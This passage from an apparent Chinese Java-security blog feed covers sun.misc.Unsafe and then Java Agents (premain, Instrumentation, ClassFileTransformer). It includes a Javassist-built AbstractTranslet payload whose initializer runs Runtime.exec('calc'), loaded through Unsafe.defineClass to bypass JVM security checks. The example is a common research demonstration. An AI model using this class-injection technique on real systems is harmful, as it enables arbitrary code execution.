IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">o</span> <span class="operator">=</span> (Unsafe)theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620110257766-771249312.png" alt="image-20220620110257727"></p><h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><p>因为Unsafe类里面存在getUnsafe方法，该方法的返回值是Unsafe的实例对象，所以可以通过反射调用该方法。</p><p>编写测试方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">o</span> <span class="operator">=</span> (Unsafe)declaredConstructor.newInstance();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620112336594-616937168.png" alt="image-20220620112336568"></p><h3 id="Class相关操作"><a href="#Class相关操作" class="headerlink" title="Class相关操作"></a>Class相关操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//静态属性的偏移量，用于在对应的Class对象中读写静态属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">//获取一个静态字段的对象指针</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">//判断是否需要初始化一个类，通常在获取一个类的静态属性的时候（因为一个类如果没初始化，它的静态属性也不会初始化）使用。 当且仅当ensureClassInitialized方法不生效时返回false</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">//确保类被初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">//定义一个类，可用于动态创建类，此方法会跳过JVM的所有安全检查，默认情况下，ClassLoader（类加载器）和ProtectionDomain（保护域）实例来源于调用者</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                   ClassLoader loader,</span><br><span class="line">                                   ProtectionDomain protectionDomain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个匿名类，可用于动态创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; hostClass, <span class="type">byte</span>[] data, Object[] cpPatches);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>学习下<code>Unsafe.defineClass()</code>的运用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.security.CodeSource;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.Certificate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, CannotCompileException, IOException, NotFoundException, NotFoundException, CannotCompileException, IOException, InvocationTargetException &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">Classname</span> <span class="operator">=</span><span class="string">&quot;org.agent.Commandtest&quot;</span>;</span><br><span class="line">        ClassPool classPool= ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass payload=classPool.makeClass(<span class="string">&quot;org.agent.Commandtest&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes=payload.toBytecode();</span><br><span class="line">        <span class="comment">//获取系统加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="comment">//创建默认保护域</span></span><br><span class="line">        <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (Certificate[]) <span class="literal">null</span>), <span class="literal">null</span>, systemClassLoader, <span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe)declaredConstructor.newInstance();</span><br><span class="line">        Class&lt;?&gt; aClass1 = unsafe.defineClass(Classname, bytes, <span class="number">0</span>, bytes.length, systemClassLoader, protectionDomain);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass1.newInstance();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在JDK 11版本以后就移除了该方法。但还可以利用<code>defineAnonymousClass</code>方法。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/14102892.html">https://www.cnblogs.com/nice0e3/p/14102892.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Unsafe类是一个位于&lt;code&gt;sun.misc&lt;/code&gt;包下的类，它提供了一些相对底层方法，能够让我们接触到一些更接近操作系统底层的资源，如系统的内存资源、cpu指令等。而通过这些方法，我们能够完成一些普通方法无法实现的功能，例如直接使用偏移地址操作对象、数组等等。但是在使用这些方法提供的便利的同时，也存在一些潜在的安全因素，例如对内存的错误操作可能会引起内存泄漏，严重时甚至可能引起&lt;code&gt;jvm&lt;/code&gt;崩溃。因此在使用&lt;code&gt;Unsafe&lt;/code&gt;前，我们必须要了解它的工作原理与各方法的应用场景，并且在此基础上仍需要非常谨慎的操作，下面我们正式开始对&lt;code&gt;Unsafe&lt;/code&gt;的学习。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Unsafe" scheme="https://kpa1on.github.io/tags/Unsafe/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Java Agent</title>
    <link href="https://kpa1on.github.io/2022/06/19/Java%E5%AE%89%E5%85%A8%E4%B9%8BJava-Agent/"/>
    <id>https://kpa1on.github.io/2022/06/19/Java%E5%AE%89%E5%85%A8%E4%B9%8BJava-Agent/</id>
    <published>2022-06-19T05:45:43.000Z</published>
    <updated>2022-06-19T16:25:40.471Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="Java-Agent简介"><a href="#Java-Agent简介" class="headerlink" title="Java Agent简介"></a>Java Agent简介</h3><p>JavaAgent 是 JDK1.5 之后引入的新特性，此特性为用户提供了在 JVM 将字节码文件读入内存之后，JVM 使用对应的字节流在 Java 堆中生成一个 Class 对象之前，用户可以对其字节码进行修改的能力，从而 JVM 也将会使用用户修改过之后的字节码进行 Class 对象的创建。Java Agent可以去实现字节码插桩、动态跟踪分析等。</p><span id="more"></span><h3 id="Java-Agent运行模式"><a href="#Java-Agent运行模式" class="headerlink" title="Java Agent运行模式"></a>Java Agent运行模式</h3><p>共两种运行模式：</p><ol><li>启动Java程序时添加<code>-javaagent(Instrumentation API实现方式)</code>或<code>-agentpath/-agentlib(JVMTI的实现方式)</code>参数；</li><li>在1.6版本新增了attach(附加方式)方式，可以对运行中的<code>Java进程</code>插入<code>Agent</code>；</li></ol><p>方式一中要在启动前去指定需要加载的Agent文件，而方式二可以在Java程序运行后根据进程ID进行动态注入Agent到JVM里面去。</p><h3 id="Java-Agent概念"><a href="#Java-Agent概念" class="headerlink" title="Java Agent概念"></a>Java Agent概念</h3><p>Javaagent是java命令的一个参数。参数javaagent可以用于指定一个jar包，并且对该jar包有2个要求：</p><ol><li>这个jar包的MANIFEST.MF文件必须指定Premain-Class项。</li><li>Premain-Class指定的那个类必须实现premain()方法。</li></ol><p>premain 方法，从字面上理解，就是运行在 main 函数之前的的类。当Java虚拟机启动时，在执行 main 函数之前，JVM会先运行-javaagent所指定jar包内Premain-Class这个类的premain方法 。普通的Java类是以main方法作为程序入口点，而Java Agent则将<code>premain</code>（Agent模式）和<code>agentmain</code>（Attach模式）作为了Agent程序的入口。</p><p>在命令行输入java可以看到相应的参数，其中有和java agent相关的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:&lt;libname&gt;[=&lt;选项&gt;] 加载本机代理库 &lt;libname&gt;, 例如 -agentlib:hprof</span><br><span class="line">另请参阅 -agentlib:jdwp=help 和 -agentlib:hprof=help</span><br><span class="line">-agentpath:&lt;pathname&gt;[=&lt;选项&gt;]</span><br><span class="line">按完整路径名加载本机代理库</span><br><span class="line">-javaagent:&lt;jarpath&gt;[=&lt;选项&gt;]</span><br><span class="line">加载 Java 编程语言代理, 请参阅 java.lang.instrument</span><br></pre></td></tr></table></figure><p>在上面<code>-javaagent</code>参数中提到了参阅<code>java.lang.instrument</code>，这是在<code>rt.jar</code>中定义的一个包，该路径下有两个重要的类：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619221439654-986889165.png" alt="image-20220619221436767"></p><p>该包提供了一些工具帮助开发人员在 Java 程序运行时，动态修改系统中的 Class 类型。其中，使用该软件包的一个关键组件就是 Javaagent。从名字上看，似乎是个 Java 代理之类的，而实际上，他的功能更像是一个Class 类型的转换器，他可以在运行时重新接受外部请求，对Class类型进行修改。</p><p>从本质上讲，Java Agent 是一个遵循一组严格约定的常规 Java 类。 上面说到 javaagent命令要求指定的类中必须要有premain()方法，并且对premain方法的签名也有要求，签名必须满足以下两种格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure><p>JVM 会优先加载 带<code>Instrumentation</code>签名的方法，加载成功忽略第二种，如果第一种没有，则加载第二种方法。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619221939998-233521183.png" alt="image-20220619221937740"></p><h3 id="Instrumentation接口"><a href="#Instrumentation接口" class="headerlink" title="Instrumentation接口"></a>Instrumentation接口</h3><p>接口中的方法描述大致如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"><span class="comment">//检测是否允许reTransformer</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isRetransformClassesSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isRedefineClassesSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//传入字节码，可以重新定义类</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span></span><br><span class="line">        <span class="keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException;</span><br><span class="line"><span class="comment">//类是否支持reTransformer</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"><span class="comment">//获取所有已经加载的类</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取类加载器下所有已经初始化的类</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isNativeMethodPrefixSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ClassFileTransformer接口"><a href="#ClassFileTransformer接口" class="headerlink" title="ClassFileTransformer接口"></a>ClassFileTransformer接口</h3><p><code>java.lang.instrument.ClassFileTransformer</code>是一个转换类文件的代理接口，我们可以在获取到<code>Instrumentation</code>对象后通过<code>addTransformer</code>方法添加自定义类文件转换器。当有新的类被<code>JVM</code>加载时，<code>JVM</code>会自动回调用我们自定义的<code>Transformer</code>类的<code>transform</code>方法，传入该类的<code>transform</code>信息(<code>类名、类加载器、类字节码</code>等)，我们可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后我们将新的类字节码返回给<code>JVM</code>，<code>JVM</code>会验证类和相应的修改是否合法，如果符合类加载要求<code>JVM</code>会加载我们修改后的类字节码。</p><p>查看一下该接口</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619223904902-413210652.png" alt="image-20220619223902779"></p><p>只有一个<code>transform</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader loader              定义要转换的类加载器；如果是引导加载器，则为 <span class="literal">null</span></span><br><span class="line">String   className           加载的类名,如:java/lang/Runtime</span><br><span class="line">Class&lt;?&gt; classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 <span class="literal">null</span></span><br><span class="line">ProtectionDomain protectionDomain   要定义或重定义的类的保护域</span><br><span class="line"><span class="type">byte</span>[]  classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重写**<code>transform</code>**方法注意事项：</p><ol><li><code>ClassLoader</code>如果是被<code>Bootstrap ClassLoader(引导类加载器)</code>所加载那么<code>loader</code>参数的值是空。</li><li>修改类字节码时需要特别注意插入的代码在对应的<code>ClassLoader</code>中可以正确的获取到，否则会报<code>ClassNotFoundException</code>，比如修改<code>java.io.FileInputStream(该类由Bootstrap ClassLoader加载)</code>时插入了我们检测代码，那么我们将必须保证<code>FileInputStream</code>能够获取到我们的检测代码类。</li><li><code>JVM</code>类名的书写方式路径方式：<code>java/lang/String</code>而不是我们常用的类名方式：<code>java.lang.String</code>。</li><li>类字节必须符合<code>JVM</code>校验要求，如果无法验证类字节码会导致<code>JVM</code>崩溃或者<code>VerifyError(类验证错误)</code>。</li><li>如果修改的是<code>retransform</code>类(修改已被<code>JVM</code>加载的类)，修改后的类字节码不得<code>新增方法</code>、<code>修改方法参数</code>、<code>类成员变量</code>。</li><li><code>addTransformer</code>时如果没有传入<code>retransform</code>参数(默认是<code>false</code>)就算<code>MANIFEST.MF</code>中配置了<code>Can-Redefine-Classes: true</code>而且手动调用了<code>retransformClasses</code>方法也一样无法<code>retransform</code>。</li><li>卸载<code>transform</code>时需要使用创建时的<code>Instrumentation</code>实例。</li></ol><h3 id="Java-Agent实现"><a href="#Java-Agent实现" class="headerlink" title="Java Agent实现"></a>Java Agent实现</h3><p>使用<code>javaagent</code>需要几个步骤：</p><ol><li>定义一个 MANIFEST.MF 文件，必须包含 Premain-Class 选项，通常也会加入Can-Redefine-Classes 和 Can-Retransform-Classes 选项。</li><li>创建一个Premain-Class 指定的类，类中包含 premain 方法，方法逻辑由用户自己确定。</li><li>将 premain 的类和 MANIFEST.MF 文件打成 jar 包。</li><li>使用参数 -javaagent: jar包路径 启动要代理的方法。</li></ol><p>实现javaagent你需要搭建两个工程，一个工程是用来承载javaagent类，单独的打成jar包；一个工程是javaagent需要去代理的类。</p><h4 id="JVM启动前运行"><a href="#JVM启动前运行" class="headerlink" title="JVM启动前运行"></a>JVM启动前运行</h4><p>工程目录结构如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── java</span><br><span class="line">│   └── org</span><br><span class="line">│       └── agent</span><br><span class="line">│           ├── Agent.java</span><br><span class="line">└── resources</span><br><span class="line">    └── META-INF</span><br><span class="line">        ├── MANIFEST.MF</span><br></pre></td></tr></table></figure><p>创建一个包含premain方法的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Agent args is : &quot;</span> + args);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load class&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面就是我实现的一个类，实现了带Instrumentation参数的premain()方法。调用addTransformer()方法对启动时所有的类进行拦截。</p><p>然后在 resources 目录下新建目录：META-INF，在该目录下新建文件：MANIFREST.MF：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br><span class="line">Premain-Class: org.agent.Agent</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>MANIFREST.MF文件的作用</p></blockquote><p>Premain-Class ：包含 premain 方法的类（类的全路径名）</p><p>Agent-Class ：包含 agentmain 方法的类（类的全路径名）</p><p>Boot-Class-Path ：设置引导类加载器搜索的路径列表。查找类的特定于平台的机制失败后，引导类加载器会搜索这些路径。按列出的顺序搜索路径。列表中的路径由一个或多个空格分开。路径使用分层 URI 的路径组件语法。如果该路径以斜杠字符（“&#x2F;”）开头，则为绝对路径，否则为相对路径。相对路径根据代理 JAR 文件的绝对路径解析。忽略格式不正确的路径和不存在的路径。如果代理是在 VM 启动之后某一时刻启动的，则忽略不表示 JAR 文件的路径。（可选）</p><p>Can-Redefine-Classes ：true表示能重定义此代理所需的类，默认值为 false（可选）</p><p>Can-Retransform-Classes ：true 表示能重转换此代理所需的类，默认值为 false （可选）</p><p>Can-Set-Native-Method-Prefix： true表示能设置此代理所需的本机方法前缀，默认值为 false（可选）</p><p>即在该文件中主要定义了程序运行相关的配置信息，程序运行前会先检测该文件中的配置项。</p><p>也可以用maven去配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">              